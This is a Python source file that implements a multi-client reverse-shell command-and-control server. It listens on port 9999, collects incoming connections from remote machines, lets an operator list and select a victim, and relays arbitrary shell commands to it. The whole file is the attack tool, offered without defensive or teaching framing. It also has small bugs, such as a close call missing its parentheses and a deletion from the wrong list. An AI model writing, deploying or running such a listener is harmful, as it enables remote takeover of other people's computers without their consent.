import socket
import threading
from queue import Queue

THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
connections = []
addresses = []

def create_socket():
    global host
    global port 
    global s

    host = "0.0.0.0"
    port = 9999

    try:
        s = socket.socket()
    except socket.error as e:
        print(f"[!] Socket Exception: {str(e)}")

def bind_socket():
    global host
    global port 
    global s

    print(f"[i] Binding to {host}:{port}")

    try:
        s.bind((host,port))
        print("[+] Binding Successful!")
        s.listen(5)

    except socket.error as e:
        print(f"[!] Socket Exception: {str(e)}")
        print("[i] Retrying...")
        bind_socket()

def accept_connections():
    for c in connections:
        c.close

    del connections[:]
    del addresses[:]

    while True:
        try:
            connection, address = s.accept()
            s.setblocking(1) # prevents timeout

            connections.append(connection)
            addresses.append(address)

            print(f"\n[+] New Connection at {address[0]}, Port {address[1]}")

        except Exception as e:
            print(f"[!] Error accepting connections: {e}")


def start_shell():
    while True:
        cmd = input("shell>")

        if cmd == "":
            cmd = input("shell>")

        if cmd == "list":
            list_connections()

        elif "select" in cmd:
            connection = get_target(cmd)
            if connection is not None:
                send_target_commands(connection)

        elif cmd is not "":
            print(f"Invalid Command: {cmd}")


def list_connections():
    results = ""

    for i, connection in enumerate(connections):
        try:
            connection.send(str.encode(" "))
            connection.recv(201480)
        except:
            del connection[i]
            del addresses[i]
            continue

        results = str(i) + "   " + str(addresses[i][0]) + "   " + str(addresses[i][1]) + "\n"

    print("---- Clients----\n\n" + results)


def get_target(cmd):
    try:
        global target
        target = cmd.replace("select ", "")
        target = int(target)
        connection = connections[target]
        print(f"[i] Connected to {str(addresses[target][0])}")
        print(str(addresses[target][0]) + ">", end="")
        return connection

    except:
        print("[!] Invalid Selection")
        return None

def send_target_commands(connection):
    while True:
        try:
            cmd = input()

            if cmd == "exit":
                break


            # use str.encode to convert string to bytes
            if len(str.encode(cmd)) > 0: # check if command is not null
                connection.send(str.encode(cmd))

                client_response = connection.recv(20480).decode("utf-8") # 1024 = bytes to read at once, utf-8 = encoding type
                print(f"({addresses[target][0]}) " + client_response, end="")
        except:
            print("[!] Error sending commands")
            break

def create_workers():
    for _ in range(THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()

        if x == 2:
            start_shell()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


if __name__ == "__main__":
    create_workers()
    create_jobs()